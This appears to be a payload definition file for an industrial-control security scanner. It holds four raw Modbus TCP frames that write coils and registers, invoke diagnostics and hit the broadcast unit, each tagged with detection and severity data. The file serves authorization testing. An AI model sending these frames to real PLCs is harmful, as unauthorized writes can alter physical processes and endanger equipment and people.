id: ot-modbus
name: OT/ICS — Modbus protocol injection
context:
  technologies: ["Modbus", "SCADA", "HMI", "PLC"]
  ports: [502]

payloads:
  - value: "\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x05\\x00\\x01\\xFF\\x00"
    detect: { status_change: true }
    id: ot-modbus-write-01
    title: "Modbus — unauthorized write single coil (FC 05)"
    severity: critical
    cwe: CWE-306

  - value: "\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x06\\x00\\x01\\x00\\x00"
    detect: { status_change: true }
    id: ot-modbus-write-02
    title: "Modbus — unauthorized write single register (FC 06)"
    severity: critical
    cwe: CWE-306

  - value: "\\x00\\x01\\x00\\x00\\x00\\x02\\x01\\x08"
    detect: { status_change: true }
    id: ot-modbus-diag-01
    title: "Modbus — diagnostic function (FC 08) accepted"
    severity: high
    cwe: CWE-306

  - value: "\\x00\\x01\\x00\\x00\\x00\\x02\\xFF\\x01"
    detect: { status_change: true }
    id: ot-modbus-broadcast
    title: "Modbus — broadcast address (unit 255) accepted"
    severity: high
    cwe: CWE-306
